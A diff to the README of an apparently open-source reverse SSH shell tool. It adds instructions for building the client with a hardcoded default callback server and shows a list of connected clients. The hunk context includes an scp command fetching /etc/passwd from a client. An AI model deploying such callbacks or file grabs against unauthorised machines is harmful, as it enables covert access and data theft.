@@ -120,12 +120,12 @@ scp -P 3232 test catcher.com:0be2782caae4bedff780e14526f7618ab61e24fa:/etc/passw
 On connection you will be presented by a list of controllable clients, e.g:
 ```
 catcher$ ls
-                    Targets
----------------------------------------------------------------------
-| ID                                       | Hostname | IP Address  |
----------------------------------------------------------------------
-| 0f6ffecb15d75574e5e955e014e0546f6e2851ac | wombo  | [::1]:45150   |
----------------------------------------------------------------------
+                                Targets
++------------------------------------------+------------+-------------+
+| ID                                       | Hostname   | IP Address  |
++------------------------------------------+------------+-------------+
+| 0f6ffecb15d75574e5e955e014e0546f6e2851ac | root@wombo | [::1]:45150 |
++------------------------------------------+------------+-------------+
 ```
 
 Use `help` or press `tab` to view commands.  
@@ -137,3 +137,16 @@ So you you wanted to connect to the client given in the example:
 Will auto complete the entry for you and on enter will connect you to your reverse shell. 
 
 
+### Default Server
+
+At build time, you can specify a default server for the client binary to connect to:
+
+```sh
+$ RSSH_HOMESERVER=localhost:1234 make
+
+# Will connect to localhost:1234, even though no destination is specified
+$ bin/client
+
+# Behaviour is otherwise normal; will connect to example.com:1234
+$ bin/client example.com:1234
+```
